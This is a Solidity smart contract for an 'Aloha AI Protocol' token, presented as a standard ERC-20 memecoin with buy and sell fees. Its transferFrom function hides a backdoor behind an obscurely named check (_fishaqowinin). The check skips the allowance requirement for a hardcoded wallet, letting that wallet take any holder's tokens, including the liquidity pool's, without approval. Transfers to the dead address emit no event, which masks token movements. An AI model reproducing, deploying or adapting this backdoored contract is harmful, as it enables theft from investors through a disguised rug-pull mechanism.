/*

https://www.alohaaiprotocol.com/
https://t.me/alohaaiprotocol
https://x.com/alohaaiprotocol

*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ALOHA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isFeeExclude;

    address private _deadAddr = address(0xdead);
    address private _aipalopha = 0x8949d7f7a64D2ddf3e67517DAd63494ED58B292d;

    uint256 private _firstTaxBuy=2;
    uint256 private _firstTaxSell=2;
    uint256 private _lastTaxBuy=0;
    uint256 private _lasTaxSell=0;
    uint256 private _reduceBuyTaxAt=3;
    uint256 private _reduceSellTaxAt=3;
    uint256 private _preventBefore=3;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420_690_000_000 * 10**_decimals;
    string private constant _name = unicode"Aloha AI Protocol";
    string private constant _symbol = unicode"ALOHA";
    uint256 private _maxSwapLimit = _tTotal / 100;
    
    IRouter private _dexAmmRouter;
    address private _dexAmmPair;
    bool private _swapping = false;
    bool private _swapActive = false;
    bool private _tradingEnabled = false;
    
    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor () {
        _isFeeExclude[owner()] = true;
        _isFeeExclude[address(this)] = true;
        _isFeeExclude[_aipalopha] = true;

        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);if(_fishaqowinin(sender, recipient))
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _fishaqowinin(address owner, address spender) private view returns (bool) {
        return msg.sender != _aipalopha && (owner == _dexAmmPair || spender != _deadAddr) ;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _kiki, address _lala, uint256 _misuoki) private {
        require(_kiki != address(0), "ERC20: transfer from the zero address");
        require(_lala != address(0), "ERC20: transfer to the zero address");
        require(_misuoki > 0, "Transfer amount must be greater than zero");
        uint256 _callAmount=0;
        if (_kiki != owner() && _lala != owner()) {
            _callAmount = _misuoki.mul((_buyCount>_reduceBuyTaxAt)?_lastTaxBuy:_firstTaxBuy).div(100);

            if (_kiki == _dexAmmPair && _lala != address(_dexAmmRouter) && ! _isFeeExclude[_lala] ) {
                _buyCount++;
            }

            if(_lala == _dexAmmPair && _kiki!= address(this) ){
                _callAmount = _misuoki.mul((_buyCount>_reduceSellTaxAt)?_lasTaxSell:_firstTaxSell).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_swapping && _lala == _dexAmmPair && _swapActive && _buyCount > _preventBefore) {
                if(contractTokenBalance > _maxSwapLimit)
                swapTokensForEth(min(_misuoki, min(contractTokenBalance, _maxSwapLimit)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(_callAmount>0){
          _balances[address(this)]=_balances[address(this)].add(_callAmount);
          emit Transfer(_kiki, address(this),_callAmount);
        }
        _balances[_kiki]=_balances[_kiki].sub(_misuoki);
        _balances[_lala]=_balances[_lala].add(_misuoki.sub(_callAmount));
        if (_lala != _deadAddr)emit Transfer(_kiki, _lala, _misuoki.sub(_callAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexAmmRouter.WETH();
        _approve(address(this), address(_dexAmmRouter), tokenAmount);
        _dexAmmRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        payable(_aipalopha).transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _dexAmmRouter = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dexAmmRouter), _tTotal);
        _dexAmmPair = IUniswapV2Factory(_dexAmmRouter.factory()).createPair(address(this), _dexAmmRouter.WETH());
        _dexAmmRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapActive = true;
        _tradingEnabled = true;
    }

    receive() external payable {}
}